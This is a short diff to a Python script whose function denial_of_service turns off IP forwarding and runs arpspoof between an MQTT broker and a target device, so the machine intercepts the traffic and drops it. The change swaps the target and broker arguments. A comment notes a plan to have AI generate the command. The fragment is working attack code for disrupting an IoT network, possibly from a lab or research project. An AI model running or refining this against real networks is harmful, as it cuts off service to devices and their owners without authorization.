@@ -59,7 +59,7 @@ def denial_of_service():
         os.system("sudo sysctl -w net.ipv4.ip_forward=0") 
         #TODO: Have AI generate this command
         #Reroutes packets from the MQTT server through this computer.
-        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, brokerIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", brokerIP, targetIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         while True:
             time.sleep(5)
     #Kills the program when desired.
